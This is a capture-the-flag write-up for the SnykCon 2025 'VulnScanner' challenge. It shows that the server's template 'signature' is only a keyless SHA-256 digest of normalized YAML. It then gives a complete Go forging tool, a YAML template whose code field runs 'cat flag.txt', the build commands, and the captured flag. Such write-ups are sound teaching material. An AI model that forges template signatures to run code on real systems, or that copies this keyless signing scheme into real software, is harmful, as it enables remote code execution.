# VulnScanner
![image](https://github.com/user-attachments/assets/afd46d3d-87bc-4772-8d00-6716cdc3b31d)

Attachment: [challenge.zip](https://github.com/LazyTitan33/CTF-Writeups/raw/refs/heads/main/SnykCon2025/attachments/vulnscanner.zip)

## Writeup

The website is talking about YAML templates:  

![image](https://github.com/user-attachments/assets/900fca58-4755-444b-8255-ec414f668eef)

It even gives an example with a template that runs code:  

![image](https://github.com/user-attachments/assets/a499b261-7ffa-49e1-b762-2b250ebf20bd)

A template list is provided:  

![image](https://github.com/user-attachments/assets/51907195-fade-4b27-909e-b247fc3ad9e2)

All of the provided examples are signed with a known digest. This is the relevant part of the source code which signs the templates:  

```golang
package main

import (
        "crypto/sha256"
        "errors"
        "fmt"
        "io/ioutil"
        "os"
        "regexp"
        "strings"

        "gopkg.in/yaml.v3"
)
// SignTemplate signs the YAML content and returns the signed template and digest.
func SignTemplate(content string) (string, string, error) {
        normalizedContent := NormalizeContent(content)
        hash := sha256.Sum256([]byte(normalizedContent))
        hexHash := fmt.Sprintf("%x", hash)
        signedTemplate := fmt.Sprintf("%s\n# digest: %s\n", content, hexHash)
        return signedTemplate, hexHash, nil
}
```

It also uses another function to normalize content:  

```golang
// NormalizeContent normalizes the YAML content.
func NormalizeContent(content string) string {
        var yamlContent interface{}
        err := yaml.Unmarshal([]byte(content), &yamlContent)
        if err != nil {
                return content
        }

        normalizedContent, err := yaml.Marshal(yamlContent)
        if err != nil {
                return content
        }
        normalizedContentStr := strings.TrimSpace(string(normalizedContent))
        return normalizedContentStr
}
```

I can reuse this code and add a function to pass a template file as an argument in order to sign it:  

```golang
package main

import (
	"crypto/sha256"
	"fmt"
	"io/ioutil"
	"os"
	"strings"

	"gopkg.in/yaml.v3"
)
// SignTemplate signs the YAML content and returns the signed template and digest.
func SignTemplate(content string) (string, string, error) {
	normalizedContent := NormalizeContent(content)
	hash := sha256.Sum256([]byte(normalizedContent))
	hexHash := fmt.Sprintf("%x", hash)
	signedTemplate := fmt.Sprintf("%s\n# digest: %s\n", content, hexHash)
	return signedTemplate, hexHash, nil
}

// NormalizeContent normalizes the YAML content.
func NormalizeContent(content string) string {
	var yamlContent interface{}
	err := yaml.Unmarshal([]byte(content), &yamlContent)
	if err != nil {
		return content
	}

	normalizedContent, err := yaml.Marshal(yamlContent)
	if err != nil {
		return content
	}
	normalizedContentStr := strings.TrimSpace(string(normalizedContent))
		return normalizedContentStr
	}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: go run main.go <template_file>")
		return
	}

	templateFile := os.Args[1]
	content, err := ioutil.ReadFile(templateFile)
	if err != nil {
		fmt.Printf("Error reading file: %s\n", err)
		return
	}

	signedTemplate, _, err := SignTemplate(string(content))
	if err != nil {
		fmt.Printf("Error signing template: %s\n", err)
		return
	}

// fmt.Println("Signed Template:")
	fmt.Println(signedTemplate)
}
```

I create a simple template to read the flag:  

```yaml
name: Code Execution Test
description: A template for testing code execution within the template.
type: http
requests:
  - method: GET
    path:
      - "/test"
    matchers:
      - type: status
        status:
          - 200
code: cat flag.txt
```
I then create the golang project, install the dependencies and run the code to create a signed template:  

```bash
go mod init yaml-signer
go get gopkg.in/yaml.v3
go run main.go template.yaml > signed_template.yaml
```
I upload my signed template and get the flag:  

![image](https://github.com/user-attachments/assets/6941be96-076e-489e-9f21-9d79fc3a60dc)

flag{e800eecf32271d760b27201eef192ead}


